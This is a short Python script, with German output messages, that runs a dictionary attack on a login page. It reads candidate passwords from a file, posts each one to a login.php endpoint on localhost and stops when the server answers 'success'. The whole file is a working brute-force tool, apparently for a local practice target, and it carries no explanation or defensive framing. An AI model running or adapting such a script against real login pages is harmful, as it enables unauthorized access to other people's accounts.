import requests, time

pw = ""
passwords = []
with open('passwords.txt') as my_file:
	for line in my_file:
		passwords.append(line)

for password in passwords:
	r = requests.post("http://localhost/login.php?password=" + str(password).rstrip()) 
	print(str(password.rstrip()))
	if r.text.lower() == "success":
		pw = password
		break

if (pw != ""):
	print(f"\nDas Password ist: {str(pw).rstrip()}")
else:
	print("Das Passwort war nicht in der Liste")